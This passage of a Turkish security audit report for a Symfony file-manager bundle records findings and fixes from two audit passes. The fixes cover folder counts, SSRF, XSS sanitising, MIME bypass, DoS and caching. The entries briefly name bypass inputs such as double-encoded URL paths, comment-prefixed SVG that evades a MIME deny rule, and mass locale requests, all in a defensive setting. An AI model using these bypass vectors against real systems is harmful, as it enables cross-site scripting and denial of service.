  - **Tespit:** Test fikstüründe `trash: ['dir_name' => '.trash']` (doğrusu `directory`), `permissions: ['voter_enabled' => true]` (doğrusu `security`) ve DBAL ön ek testinde kök düzeyinde ayrışan NFD anahtar kullanılmıştı.
  - **Düzeltme:** Fikstür anahtarları şema ile birebir hizalandı ve NFC önek altında NFD/NFC çocuk satır çarpışması doğrudan test edildi.

- [x] **T12-06 [CACHE DAVRANIŞ TUTARSIZLIĞI] `ThumbnailController` `cache.enabled: false` vs `volume.cache_ttl`**
  - **Dosya:** `src/Controller/ThumbnailController.php`
  - **Tespit:** Profilde `cache.enabled: false` açıkça kapalıyken hacimde `cache_ttl > 0` olması tarayıcı önbellek başlığını `public, immutable` yapabiliyordu.
  - **Düzeltme:** Önce `$profile->cache['enabled']` kontrol edildi; kapalıysa `$volume->cacheTtl` değeri tek başına herkese açık önbelleği zorlamaz.

- [x] **T12-07 [MANTIK TUTARSIZLIĞI] `FilenameNormalizer` `slugger: false` + `transformer: 'folder'` Affix Kaybı**
  - **Dosya:** `src/Service/FilenameNormalizer.php`
  - **Tespit:** `slugger: false` ve `transformer: 'folder'` birleşiminde `prepend` / `append` ekleri düşebiliyordu.
  - **Düzeltme:** `transformBaseName()` sonrasında `applyAffixes()` akışı korunarak önek/sonek kaybı giderildi.

- [x] **T12-08 [SUBSCRIBER SIKILAŞTIRMA] `AutoInjectDialogHostSubscriber` Picker Algılama Sınırlandırması**
  - **Dosya:** `src/EventListener/AutoInjectDialogHostSubscriber.php`
  - **Tespit:** HTML yanıtı gövdesinde rastgele bir metin/yorum içinde controller adının geçmesi enjeksiyon tetikleyebiliyordu.
  - **Düzeltme:** Gerçek Stimulus özniteliği (`data-controller="...liveux--file-manager-bundle--picker..."`) şartı getirildi.

- [x] **T12-09 [İSTEMCİ DURUMU] `BrowserController::doubleClickFile()` & `clearCache()`**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Tespit:** Seçici dialog içinde `double_click_to_select: false` olduğunda dosya önizlemesi (lightbox) açılmayıp sessizce dönüyordu; ayrıca çöp kutusu modundayken `clearCache()` ağaç önbelleğini yeniden doldurmuyordu.
  - **Düzeltme:** `doubleClickToSelectValue === false` durumunda önizleme akışına düşüldü ve `clearCache()` çöp kutusu modunda da `refreshFullTree(true)` çağıracak şekilde güncellendi.

---

## 13. 12. Tur (Pass-12) — Klasör Öğe Sayısı Kök Neden Çözümü + Yeni Güvenlik, Mantık, Performans ve Global Unicode Bulguları (`P12-01` – `P12-13`)

> **Denetim Tarihi:** `24.11.2026` | **Denetçi Model:** **Google Antigravity — Gemini 4 (Extra High Reasoning)**  
> **Doğrulama:** `tests/Unit/Security/TwelfthPassGlobalSecurityAuditTest.php`, `tests/Js/frontend_audit_test.mjs` (Test 16)

### 13.1. Klasörlerde Öğe Sayılarının Görünmemesi Kök Neden Analizi ve Çözümü (`P12-01` – `P12-05`)

Yapılandırmada `show_folder_item_count: true` aktif olmasına rağmen arayüzde hem klasör karolarında/kartlarında/liste satırlarında hem de sol ağaçta klasör sayılarının görünmemesinin **5 katmanlı kök nedeni** tespit edildi:

- [x] **P12-01 [KRİTİK KÖK NEDEN — VOTER KILL-SWITCH] `DirectoryLister::shouldResolveFolderCounts()` & `resolveFolderCount()` Genel Kapatma Hatası**
  - **Dosya:** `src/Service/DirectoryLister.php`
  - **Bulgu:** `services.php` tarafından `AuthorizationCheckerInterface` her Symfony uygulamasına otomatik enjekte edildiği ve `security.voter_enabled` varsayılan olarak `true` olduğu için, `DirectoryLister` içindeki `if ($this->authChecker !== null && $profile->isVoterEnabled()) { return null; }` kilidi tüm projelerde **istisnasız tüm klasör sayımlarını `null` yaparak** rozeti gizliyordu; buna karşın `BrowserComponent` istemciye `showFolderItemCount: true` gönderiyordu.
  - **Yapılan Değişiklik:** Genel kill-switch kaldırıldı; Voter açıkken de tüm görünür klasörlerin sayıları `filterVisibleRawNodes()` + `buildFolderCountsFromRawNodes()` üzerinden hesaplandı. Alt klasörleri reddeden özel bir Voter bulunduğunda reddedilen alt klasörler ve içerdikleri dosyalar üst klasör toplamından tamamen çıkarılarak **count-oracle bilgi sızıntısı engellendi**.

- [x] **P12-02 [DERİN AĞAÇ & DÜĞÜM SINIRI] 6 Seviye Üstü Derinlik (`depth > 6`) ve `MAX_TREE_NODES` Sınırı Sonrası Sayaç Kaybı**
  - **Dosya:** `src/Service/DirectoryLister.php`
  - **Bulgu:** `scanFullFolderTree()` derinlik 6'ya veya `2000` düğüm sınırına ulaştığında `$truncated = true` işaretini tüm üst ata zincirine yayıp `recursiveFileCount = null` yapıyordu; öte yandan Voter aktifken derin sınır klasörlerinin (`l6 → l7/l8`) toplamı sadece sığ `directFileCount` üzerinden toplanınca `0` dönebiliyordu.
  - **Yapılan Değişiklik:** Kenar düğümler için sınırlı alt sayıcılar (`countDeepSubtree()` / `countDeepSubtreeVoterAware()`, `MAX_COUNT_DEPTH=16`, `MAX_COUNT_DIRS=5000`) ve `getFolderCountMapForDirectory()` içinden `countFolderOnDemand()` eklendi; böylece hem derinliği 6'yı aşan dallar hem Voter kısıtlı derin alt klasörler doğru sayıyı döndürür.

- [x] **P12-03 [BULUT/S3 PERFORMANSI & İSTEK MEMOİZASYONU] Tek Geçişli Bulut Ağacı Tarayıcısı ve `DirectoryCacheManager` Epoch Senkronu**
  - **Dosyalar:** `src/Service/DirectoryLister.php`, `src/Service/DirectoryCacheManager.php`
  - **Bulgu:** S3/bulut hacimlerinde `scanFullFolderTree()` her klasör için ayrı `listContents(..., false)` HTTP çağrısı atarak `O(F)` N+1 gecikmeye yol açıyordu; `cache.enabled: false` iken tek bir SSR/list isteğinde ağaç 2–3 kez yeniden taranıyordu.
  - **Yapılan Değişiklik:** Bulut hacimleri için tek `listContents('', true)` çağrısı kullanan `scanCloudFolderTree()`, `registerCloudAncestors()` ve `flattenSortedCloudNodes()` (`MAX_CLOUD_TREE_ENTRIES=25000`) eklendi. `DirectoryLister` `ResetInterface` uygulayarak `$requestTreeCache` bellek önbelleğini `DirectoryCacheManager::getInvalidationEpoch()` ile senkronladı.

- [x] **P12-04 [ÇAPRAZ HACİM ÖNBELLEK GEÇERSİZ KILMA] İç İçe Yerel Hacimler (`local::` Kökleri)**
  - **Dosya:** `src/EventListener/CacheInvalidationListener.php`
  - **Bulgu:** `public/uploads/editor` gibi alt-klasör köküne bağlı yerel bir hacimde yapılan dosya ekleme/taşıma/silme işlemi, `public/uploads` köküne bağlı üst yerel hacmin önbelleğe alınmış ağaç/sayaç/kota anahtarlarını geçersiz kılmıyordu.
  - **Yapılan Değişiklik:** `invalidateOverlappingLocalRoots()` ile alt yerel hacimdeki değişikliklerin tüm üst yerel köklerin `__tree_v2__`, kota ve SHA-256 önbelleklerini otomatik geçersiz kılması sağlandı.

- [x] **P12-05 [FRONTEND YENİLEME, CSS ÇAKIŞMASI & YERELLEŞTİRİLMİŞ SAYIM] İstemci Ağaç Senkronu & Tile Düzeni**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `assets/styles/core.css`, `src/Controller/ApiController.php`
  - **Bulgu:** `refreshCurrent()` paralel ağaç yenilemesi yaparken `tree(full=1&refresh=1)` kapsamında `listSubfolders()`'a `$forceRefresh` geçilmiyordu; `urlForm`, `imageEditor`, `clone`, `saveFileMetadata` mutasyonları sonrası `treeCache` siliniyor ancak `refreshFullTree(true)` çağrılmadığı için ağaç ve dosya listesi sayı senkronunu yitiriyordu; `.liveux-fm-folder-tile` üzerinde `.is-selected`, `:focus-within` veya dokunmatik cihazlarda `⋯` butonu ile sayı rozeti üst üste biniyor, sağdan-sola (RTL) veya Arapça/Farsça sayı biçimlendirmede `dir="ltr"` izolasyonu eksik kalıyordu.
  - **Yapılan Değişiklik:** `ApiController::tree()` içine `$forceRefresh` iletimi (kapsamlı/kısıtlı kullanıcıların global havuz boşaltması engelli) ve `clearCache(scope: 'dir')` içine `TREE_CACHE_KEY` eklendi; `browser_controller.js` tüm mutasyon akışlarında `refreshFullTree(true)` çağırıp `renderFolderCountHtml()` içine `formatNumber()` + `dir="ltr"` ekledi; `core.css` tile padding'ini (`padding-inline: 10px 42px`, dokunmatik `64px`) ve `.is-selected`/hover/`:focus-within` görünürlüğünü ile BiDi `unicode-bidi: isolate` kurallarını ekledi.

### 13.2. Yeni Güvenlik, Eşzamanlılık, Performans ve Global Unicode Bulguları (`P12-06` – `P12-13`)

- [x] **P12-06 [YÜKSEK GÜVENLİK — SSRF & IDNA2008] `UnicodeHelper::canonicalizeHostToAscii()` IPv6 & Non-Transitional IDNA2008**
  - **Dosya:** `src/Util/UnicodeHelper.php`
  - **Bulgu:** Köşeli parantez içindeki `[8.8.8.8]` veya `[:::]` gibi geçersiz IPv6 biçimleri doğrulama dışı kalabiliyordu; ayrıca transitional IDNA Almanca `straße.de`, Yunanca `βόλος.gr` ve Farsça ZWNJ (`بخش‌نامه.ir`) alan adlarını bozuyordu.
  - **Yapılan Değişiklik:** `filter_var(..., FILTER_FLAG_IPV6)` doğrulaması ve `IDNA_NONTRANSITIONAL_TO_ASCII | IDNA_CHECK_BIDI | IDNA_CHECK_CONTEXTJ` bayrakları eklendi.

- [x] **P12-07 [YÜKSEK GÜVENLİK — SVG / CSS / URL XSS] 5 MB SVG Sınırı, Fail-Closed CSS Decode, `image()`/`cross-fade()`, `<use>`/`srcset` ve Çift Kodlanmış `/%252f`**
  - **Dosyalar:** `src/Security/SvgSanitizer.php`, `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`, `src/Service/FileOperationsService.php`, `src/Service/AssetUsageGuardService.php`, `src/Twig/Extension/FileManagerTwigExtension.php`, `assets/controllers/{browser,dialog,picker}_controller.js`, `assets/js/integrations/{ckeditor5,tinymce,tiptap}_adapter.js`
  - **Bulgu:** Dev SVG dosyaları bellek DoS riski taşıyor, PCRE hatasında `decodeCssEscapes()` kısmi dize dönebiliyor, CSS `image()` ve `cross-fade()` / `-webkit-cross-fade()`, `<use>`/`<image>` dışı öğelerde kalan tehlikeli `href`/`srcset`/`imagesrcset`/`poster` ile çift URL kodlanmış `/%252f`, `/%255c` ve önde boşluklu `/ evil` URL'leri atlatma riski oluşturuyordu.
  - **Yapılan Değişiklik:** `SvgSanitizer::MAX_SVG_BYTES = 5_242_880` (`5 MB`) ve fail-closed `decodeCssEscapes(): ?string` eklendi; sunucu ve tüm istemci SVG/CSS/URL bekçilerinde `image()`, `cross-fade()`, `/%252f`, `/%255c`, `/\s` ve `srcset`/`poster`/`<use>` harici `href` vektörleri engellendi.

- [x] **P12-08 [ORTA GÜVENLİK — TAŞMA & BAŞLIK İZOLASYONU] `ByteSizeParser` `PHP_INT_MAX` Kıskaçlaması & Controller `Cache-Control: private, no-store` / `nosniff`**
  - **Dosyalar:** `src/Util/ByteSizeParser.php`, `src/Controller/{Api,Upload,ImageEditor}Controller.php`
  - **Bulgu:** Çok büyük boyut dizeleri `(int)` dönüşümünde negatif `PHP_INT_MIN` taşmasına yol açabiliyordu; AJAX JSON uç noktaları `private, no-store, max-age=0` ve `X-Content-Type-Options: nosniff` başlıklarını merkezi yanıt yardımcısı üzerinden garanti etmiyordu.
  - **Yapılan Değişiklik:** `ByteSizeParser` `>= PHP_INT_MAX` değerlerini `PHP_INT_MAX`'e sabitledi; üç controller da `privateJsonResponse()` kullanacak şekilde sertleştirildi.

- [x] **P12-09 [EŞZAMANLILIK & DOSYA SİSTEMİ GÜVENLİĞİ] Chunk Kilidi, `fwrite`/Akış Dönüş Kontrolleri, Hata-Sonrası Thumbnail Silme & Restore Hedef Voter Kapısı**
  - **Dosyalar:** `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`, `src/Service/TrashManager.php`, `src/Service/FileOperationsService.php`, `src/Metadata/JsonFileMetadataStorage.php`, `src/Service/ImageOptimizer.php`
  - **Bulgu:** `UploadManager::cleanupChunkDir()` montaj kilidi dışındaydı; `fwrite`/`file_put_contents`/`stream_copy_to_stream` bayt dönüşleri yer yer denetlenmiyordu; `JsonFileMetadataStorage::writeAtomically()` yazma hatasında `$memoryCache` tutarlılığını bozacak şekilde sessiz başarısız olabiliyordu; `FileOperationsService` küçük resimleri kalıcı silme/çöp başarısız olmadan önce temizleyebiliyordu; `TrashManager::restore()` çarpışma nedeniyle yeniden adlandırılan hedef dosya yolunu Voter ile denetlemiyordu.
  - **Yapılan Değişiklik:** Chunk temizliği `.assemble.lock` altına taşındı; tüm G/Ç yazmalarında kesin bayt kontrolü ve `JsonFileMetadataStorage` üzerinde `RuntimeException` eklendi; `FileOperationsService` post-silme küçük resim temizliğine geçti ve `preValidateBulkMoveItems()` macOS `Darwin` büyük/küçük harf duyarsızlığına uyarlandı; `TrashManager::restore()` hedef ad değiştiğinde hem dosya hem klasörler için `assertAccessiblePath` + Voter doğrulamasını zorunlu kıldı.

- [x] **P12-10 [PERFORMANS — `TrashManager` & İSTEMCİ ARAYÜZ] S3 `fileExists` N+1 Azaltma, Arama Önbelleği & Marquee Read/Write Ayrımı**
  - **Dosyalar:** `src/Service/TrashManager.php`, `src/Thumbnail/Driver/ImagickThumbnailDriver.php`, `assets/controllers/browser_controller.js`
  - **Bulgu:** `TrashManager::resolveEntry()` haritada mevcut olmayan girişler için her defasında uzak S3 `fileExists()` çağrısı yapıyordu; `ImagickThumbnailDriver` `contain` modunda küçük görselleri yukarı ölçekleyebiliyordu; `BrowserController::itemMatchesSearch()` her tuşta tüm öğeleri yeniden Unicode katlıyordu ve `onMouseMove` marquee okumaları yazımla iç içeydi.
  - **Yapılan Değişiklik:** `resolveEntry()` önce `$cachedFallbackMap`'e baktı; `ImagickThumbnailDriver` küçük görsellerde upscale engelini ekledi; `BrowserController` `WeakMap` tabanlı `getItemSearchCache()`, `onMouseMove` öncesi toplu DOM geometri okuması, `fetchDirectory()` içinde `trashMode` yarışı engeli ve `isDisconnected` korumaları kazandı.

- [x] **P12-11 [GLOBAL ÇOK-DİLLİ & ERİŞİLEBİLİRLİK] `event.code` Non-Latin Kısayollar, ZWNJ Şerit Temizliği, Tam-Genişlik Arama, Sayı Yerelleştirme & RTL Arayüz**
  - **Dosyalar:** `src/Service/MessageTranslator.php`, `src/Metadata/FolderMetadata.php`, `src/AI/AssetEnrichmentResult.php`, `assets/controllers/{browser,dialog,picker}_controller.js`
  - **Bulgu:** Kiril/Arapça/Yunanca klavye düzenlerinde `Ctrl+A` / `Ctrl+F` gibi kısayollar `event.key` nedeniyle çalışmıyordu; Farsça alternatif ZWNJ/ZWJ kenar karakterleri ve `ＰＤＦ` tam genişlikli ASCII arama terimleri eksik normalize ediliyordu; sayfa atlama/kota/çöp sayıları her yerde `formatNumber()` / `parseLocalizedInt()` ve RTL `↪` okuyla uyumlu değildi; `activeColorScheme` tüm profiller arasında ortak `localStorage` anahtarını paylaşıyordu.
  - **Yapılan Değişiklik:** `MessageTranslator`, `DialogController` ve `BrowserController` `28` LTR script listesinde eşitlendi; `FolderMetadata` ve `AssetEnrichmentResult` ardışık ZWNJ/ZWJ kenar temizliği kazandı; `onKeydown()` Latin dışı klavyeler için `/^Key([A-Z])$/` (`event.code`) yedeği, `foldSearch()` NFC + tam genişlikli ASCII (`U+FF01–U+FF5E`) katlama desteği, sayfalama/kota/çöp sayaçları `parseLocalizedInt()` + `formatNumber()` + RTL `↪` oku, `activeColorScheme` ise profile özgü `localStorage` anahtarı kazandı.

- [x] **P12-12 [KAPSAMLI DOĞRULAMA] Yeni PHPUnit & JS Regresyon Süitleri + Tüm QA Kapıları**
  - **Dosyalar:** `tests/Unit/Security/TwelfthPassGlobalSecurityAuditTest.php`, `tests/Unit/Security/{Ninth,Tenth,Eleventh}PassGlobalSecurityAuditTest.php`, `tests/Js/{dom_security_test,frontend_audit_test}.mjs`
  - **Yapılan Değişiklik:** Tüm `8` QA komutu eksiksiz `0` hatayla geçti: PHP lint (`154/154`), PHPStan Level 8 (`0` hata), PHPUnit (`298/298` test, `3.071` assertion), JS sözdizimi (`7/7`), Node/npm JS süitleri (`30/30`), Twig (`33/33`), YAML (`3/3`) ve Symfony `cache:clear`.

- [x] **P12-13 [RAPOR ARŞİVİ] 12. Tur Tam Kaydı & Doküman Bütünlüğü**
  - **Dosyalar:** `docs/tr/14-guvenlik-denetim-ve-degisiklik-raporu.md`, `docs/tr/README.md`
  - **Yapılan Değişiklik:** Klasör sayı sorunu dahil 12. turun tüm tutarsızlık doğrulamaları (`T12-01`–`T12-09`) ve yeni bulgular (`P12-01`–`P12-14`), denetçi model bilgisi (**Google Antigravity — Gemini 4 (Extra High Reasoning)**) ile bu rapora kalıcı olarak işlendi.

- [x] **P12-14 [KRİTİK PERFORMANS — PROFILER `3.015 ms → 5.8 ms` SSR HIZLANDIRMA] Tam-Grafik Önbellek, Harici Voter Algılama, ASCII Segment Hızlı Yolu & `BrowserComponent`/`IconSetRegistry` Optimizasyonu**
  - **Dosyalar:** `src/Service/DirectoryLister.php`, `src/DependencyInjection/Compiler/DetectExternalVotersPass.php`, `src/FileManagerBundle.php`, `src/Security/FileSecurityGuard.php`, `src/Twig/Components/BrowserComponent.php`, `src/Icon/IconSetRegistry.php`, `config/services.php`, `config/packages/liveux_file_manager.yaml`
  - **Bulgu:** Symfony Profiler profilinde `@FileManager/components/Browser.html.twig` render süresinin `3.015 ms`'ye (`debug.security.authorization.vote`: `101 ms`) çıktığı tespit edildi. Kök nedenler: (1) `public/uploads` (`1.098` klasör, 8 seviye derinlik) üzerinde depth-6 sınırında kalan `208` klasör (altında `1.018` adet depth-6..8 alt klasör), ilk tarama sırasında Voter-sınır alt-ağacını (`recursiveFileCount > directFileCount`) sıcak önbelleğe rağmen `list()` + `listFullTree()` içinde iki kez baştan diske taratıyordu; (2) `BrowserComponent` kök klasörde gereksiz tekrar `list()` çağırabiliyor ve `listFullTree()` + `getFolderCountMap()` Voter/toplam hesaplamasını istek içinde paylaşmıyordu; (3) `FileSecurityGuard` derin taramalarda her çocuk için tüm ata yolunu baştan NFKC/skeleton normalize ediyordu; (4) `IconSetRegistry` dahili SVG ikon setlerini `cache.app` havuzuna almıyordu; (5) host config içindeki `volume_layout` / `pagination_mode` kullanımdan kaldırılmış seçenekleri deprecation uyarısı üretiyordu.
  - **Yapılan Değişiklik:**
    1. `DirectoryLister` tüm ağaç grafiğini `depth` (`0..15`, `MAX_GRAPH_DEPTH=16`, `MAX_GRAPH_NODES=5000`) alanı ile tek `__tree_v2__` anahtarında önbellekledi; `resolveVisibleTreeAndCounts()` ve `$requestGrantCache` ile `list()` + `listFullTree()` arasında istek-içi tam paylaşım sağlandı; `listFullTree()` UI çıktısını `depth < $maxDepth` filtresiyle tek önbellekten süzdü.
    2. `DetectExternalVotersPass` CompilerPass'i konteynerdeki `security.voter` etiketlerini inceleyip yalnızca Symfony yerleşik Voter'ları + `FileManagerVoter` varsa `$hasExternalVoters: false` geçirerek `O(1)` root izin kontrolü, özel Voter varsa (`SepetPaketVoter` vb.) tam yol-bazlı fail-safe denetim uyguladı.
    3. `FileSecurityGuard::isChildSegmentIgnored()` ve `assertSegmentAccessible()` salt ASCII (`[\x21-\x7E]+`) hızlı yoluyla gereksiz UTF-8 normalizasyonlarını atladı.
    4. `BrowserComponent` ilk sayfa listesinden tam listeyi dilimleyerek yinelenen `DirectoryLister::list()` çağrısını kaldırdı; `IconSetRegistry` yerleşik ikon setlerini `cache.app` üzerinde `86400s` TTL ile önbellekledi; host YAML'daki deprecated `volume_layout` / `pagination_mode` satırları temizlendi.
  - **Ölçüm & Regresyon:** Gerçek `public/uploads` dizini üzerinde (`TagAwareAdapter(FilesystemAdapter)` + `DirectoryLister`) soğuk ilk tarama `1.383,1 ms`, **sıcak önbellekli istek `5,8 ms`** olarak ölçüldü (`TwelfthPassGlobalSecurityAuditTest::testFullGraphWarmCacheZeroRescanDetectExternalVotersGuardAndIconCache`).

---

## 14. 13. Tur (Pass-13) — `24.11.2026` — Pass-12 Tutarlılık Doğrulaması + Derinlik/DI/MIME/Önbellek/Çok-Dilli Güvenlik & Performans Denetimi (`T13-01`–`T13-09` & `P13-01`–`P13-16`)

> **Denetim Tarihi:** `24.11.2026` | **Denetçi Model:** **Google Antigravity — Gemini 4 (Extra High Reasoning)**  
> **Doğrulama:** `tests/Unit/Security/ThirteenthPassGlobalSecurityAuditTest.php`, `tests/Js/frontend_audit_test.mjs` (Test 17)

### 14.1. Pass-12 Kod-Rapor Tutarlılık Doğrulaması (`T13-01` – `T13-09`)

- [x] **T13-01 [DI & VOTER ALGILAMA] `DetectExternalVotersPass` Öncelik ve Dekoratör Doğrulaması**
  - **Dosyalar:** `src/FileManagerBundle.php`, `src/DependencyInjection/Compiler/DetectExternalVotersPass.php`
  - **Bulgu:** `DetectExternalVotersPass` varsayılan `TYPE_BEFORE_OPTIMIZATION` (`0`) aşamasında çalışıyordu; özel `security.voter` tanımları, dekoratör sarmalayıcıları ve özel `security.authorization_checker` / `security.access.decision_manager` dekoratörleri gözden kaçabiliyordu.
  - **Düzeltme:** Pass `PassConfig::TYPE_BEFORE_REMOVING` aşamasına taşındı; `getDecoratedService()` döngü korumalı özyinelemeli çözümlemesi (`$visited`), sınıf adı yedek çözümlemesi ve `authorization_checker` / `decision_manager` dekoratör taraması eklendi.

- [x] **T13-02 [DERİN AĞAÇ SAYIMI & KESME GÖSTERGESİ] `countDeepSubtree()` Relatif Derinlik ve Sınır Hataları**
  - **Dosya:** `src/Service/DirectoryLister.php`
  - **Bulgu:** `countDeepSubtree()` sınırda `$depth + 1` (`17 > 16`) aldığı için hiç alt tarama yapmadan `0` döndürüyor, `MAX_GRAPH_NODES` / `MAX_CLOUD_TREE_ENTRIES` kesilmelerinde `0` sahte sayı üretiyor ve `items` modu derin sınır düğümlerini yeniden saymıyordu.
  - **Düzeltme:** Relatif derinlik `0` ile başlatıldı; kesilen (`truncated: true`) dallar `null` döndürdü; `buildFolderCountsFromRawNodes()` hem `recursiveFileCount === null` hem `directItemCount > directFileCount` sınır durumlarını Voter-uyumlu derin sayıcıya bağladı ve `countDeepSubtreeVoterAware()` dosyalarda da `isViewGrantedCached()` denetledi.

- [x] **T13-03 [SSR PERFORMANS & LAZY TREE] `BrowserComponent::getInitialTreeJson()` ve Filtreli İlk Liste Yeniden Kullanımı**
  - **Dosyalar:** `src/Twig/Components/BrowserComponent.php`, `assets/controllers/browser_controller.js`
  - **Bulgu:** `show_folder_tree: false` iken `getInitialTreeJson()` tüm klasör ağacını yine tarıyor, `?type=image` gibi filtreli ilk sayfalarda ise `DirectoryLister::list()` iki kez çağrılıyordu.
  - **Düzeltme:** `show_folder_tree: false` durumunda `getInitialTreeJson()` `[]` döndürür (`toggleSidebar()` açıldığında `refreshFullTree(false)` tembel yükler); ilk sayfa tip filtresi `getFullInitialDirectoryListing()` önbelleğinden filtrelenip dilimlenir.

- [x] **T13-04 [BULUT ÇÖP KUTUSU N+1] `TrashManager::resolveEntry()` Yanlış Harita Anahtarı**
  - **Dosya:** `src/Service/TrashManager.php`
  - **Bulgu:** `$cachedFallbackMap` tam kanonik `buildFallbackKey()` ile anahtarlandığı halde `resolveEntry()` ham `$trashId` aradığı için hızlı yol hiç çalışmıyor ve S3 `fileExists()` N+1 çağrısı sürüyordu.
  - **Düzeltme:** `resolveEntry()` hem `$this->buildFallbackKey($volume, $trashId, $basePath)` hem eski `<volume>::<id>` anahtarını kontrol edecek şekilde düzeltildi.

- [x] **T13-05 [ÖZEL İKON SETİ REWIRE & CWD HIJACK] `IconSetRegistry` Yol/Havuz Düzeltmesi**
  - **Dosyalar:** `src/Icon/IconSetRegistry.php`, `src/FileManagerBundle.php`
  - **Bulgu:** `is_dir($iconSet)` önce çalıştığı için çalışma dizinindeki (CWD) `'classic'` klasörü yerleşik seti ele geçirebiliyordu; özel `defaults.cache.pool` ise `IconSetRegistry`'ye aktarılmıyordu.
  - **Düzeltme:** `isBuiltinSet($iconSet)` kontrolü `is_dir()` önüne alındı ve özel dizinler için yol ayırıcısı zorunlu kılındı; `FileManagerBundle` özel önbellek havuzunu `IconSetRegistry::$cachePool` üzerine de bağladı.

- [x] **T13-06 [GLOBAL EMOJI/CJK VS16/IVS] `UnicodeHelper::hasEdgeInvisibleOrTrailingDot()` Sonda Variation Selector Desteği**
  - **Dosya:** `src/Util/UnicodeHelper.php`
  - **Bulgu:** `❤️.png`, `🖼️.webp` veya CJK IVS (`葛󠄀.pdf`) gibi görünür karakterlere ekli sona gelen `U+FE0F` / `U+E0100–U+E01EF` seçicileri sondaki görünmez karakter sayıldığı için reddediliyordu.
  - **Düzeltme:** Sona ekli VS1..VS16 ve IVS karakterleri yalnızca geçerli görünür (nokta veya boşluk olmayan) bir karaktere bağlandığında kabul edilirken baştaki VS, `.\u{FE0F}` ve uzantı içi sahtecilik (`xss.s\u{FE0F}vg`) engellenmeye devam edildi.

- [x] **T13-07 [CSS COMPACT TILE ÇAKIŞMASI] `core.css` Kompakt Klasör Karosu Padding Koruması**
  - **Dosya:** `assets/styles/core.css`
  - **Bulgu:** `[data-size-tier="compact"] .liveux-fm-folder-tile` üzerinde `padding-inline: 8px 26px` kuralı hem masaüstü `42px` hem dokunmatik `64px` sağ rozet/menü boşluğunu eziyordu.
  - **Düzeltme:** `padding-inline-start: 8px;` olarak değiştirilerek sağ padding değerleri korundu.

- [x] **T13-08 [PICKER VS16 UYUMU] `picker_controller.js::isSafeRelativePath()` Backend Paritesi**
  - **Dosya:** `assets/controllers/picker_controller.js`
  - **Bulgu:** İstemci `isSafeRelativePath()` gövde sonundaki `❤️` / `葛󠄀` variation selector karakterlerini blokluyordu.
  - **Düzeltme:** Backend `UnicodeHelper` kuralı ile birebir eşitlenerek gövde içi VS16/IVS açıldı, baştaki VS/uzantı spoofing engeli korundu.

- [x] **T13-09 [DOKÜMAN TUTARLILIĞI] `P12-11` Açıklama Düzeltmesi ve `picker-and-js-api.md` `color_scheme` Eki**
  - **Dosyalar:** `docs/tr/14-guvenlik-denetim-ve-degisiklik-raporu.md`, `skills/liveux-file-manager-forms-and-editors/references/picker-and-js-api.md`
  - **Bulgu:** `P12-11` metni `foldSearch()` için NFKC diyordu (kodda NFC + fullwidth ASCII uygulanmaktadır); `picker-and-js-api.md` tablosunda `color_scheme` seçeneği eksikti.
  - **Düzeltme:** Her iki doküman kaydı kodla %100 uyumlu hale getirildi.

### 14.2. Yeni Güvenlik, Eşzamanlılık, Performans ve Global Çok-Dilli Bulgular (`P13-01` – `P13-16`)

- [x] **P13-01 [YÜKSEK GÜVENLİK — DoS] Yetkisiz `?locale=` ile Symfony Çeviri Katalog/OPcache Taşması**
  - **Dosyalar:** `src/Service/MessageTranslator.php`, `src/FileManagerBundle.php`
  - **Bulgu:** Saldırgan rastgele geçerli biçimli (`aa_00000001` vb.) yüzbinlerce `?locale=` isteği göndererek Symfony `TranslatorBagInterface::getCatalogue()` üzerinden `var/cache` ve OPcache belleğini şişirebiliyordu.
  - **Düzeltme:** `LOCALE_PATTERN` BCP-47 language-script-region biçimine daraltıldı; `FileManagerBundle::collectAllowedCatalogLocales()` bilinen katalog/profil/kernel dillerini `MessageTranslator::$allowedCatalogLocales` olarak enjekte ederek bilinmeyen dillerde `getCatalogue()` / `trans()` çağrılarını engelledi.

- [x] **P13-02 [KRİTİK GÜVENLİK & EŞZAMANLILIK] Çapraz Profil Ağaç Zehirlenmesi, Voter Kapalı Fail-Open ve Windows Chunk Kilidi**
  - **Dosyalar:** `src/Service/DirectoryLister.php`, `src/Service/UploadManager.php`
  - **Bulgu:** (1) `DirectoryLister::$requestTreeCache` `$profile->name` anahtarını içermediği için aynı volume'ü paylaşan farklı profiller (`exclude_patterns` farkı) istek içi bellek önbelleğini zehirliyordu; (2) `voter_enabled: false` + `permissions.view: false` durumunda `filterVisibleRawNodes()` fail-open davranıyordu; (3) `UploadManager::handleChunk()` parça temizliğini `.assemble.lock` serbest bırakıldıktan sonra yaptığı için Windows'ta 20 paralel montaj kilidi kilitlenmesine neden olabiliyordu.
  - **Düzeltme:** `$memKey` içine `$profile->name` eklendi; `filterVisibleRawNodes()` ve `isViewGrantedCached()` `!$profile->isVoterEnabled()` durumunda kök `VIEW` denetimiyle fail-closed yapıldı; `UploadManager::handleChunk()` temizliği kilit serbest bırakılmadan önceye (`.assemble.lock` hariç tutularak) alındı.

- [x] **P13-03 [YÜKSEK GÜVENLİK — SVG XSS / MIME BYPASS] Yorumlu SVG'nin `upload_deny: ['image/svg+xml']` Atlatması**
  - **Dosyalar:** `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`
  - **Bulgu:** Dosya başında `<!-- comment --><svg ...>` bulunan SVG yüklemelerinde `finfo` (`MimeTypes`) `text/plain` veya `text/xml` döndürdüğü için `upload_deny: ['image/svg+xml']` politikası atlatılabiliyordu.
  - **Düzeltme:** `.svg` uzantılı veya ilk 4 KB içeriğinde `<svg\b` bulunan `text/plain`/`text/xml`/`application/xml`/`image/svg` dosyaları hem normal yüklemede hem ZIP açmada `'image/svg+xml'` olarak kanonikleştirildi.

- [x] **P13-04 [YÜKSEK GÜVENLİK — RBAC / KÖTÜ CACHE] Yetkisiz Ağaç `refresh=1`, Ön-Auth `resolveExistingPath()` Önbellek Silme & Geçici Hata Önbellekleme**
  - **Dosyalar:** `src/Service/DirectoryLister.php`, `src/Controller/ApiController.php`
  - **Bulgu:** Alt-klasör yetkili kullanıcı `list()` isteğiyle yetki öncesi `resolveExistingPath()` üzerinden üst önbellekleri silebiliyor veya geçici S3/disk hataları `loadCachedRawTree()` içinde 3600 sn boyunca boş `[]` olarak önbellekleniyordu.
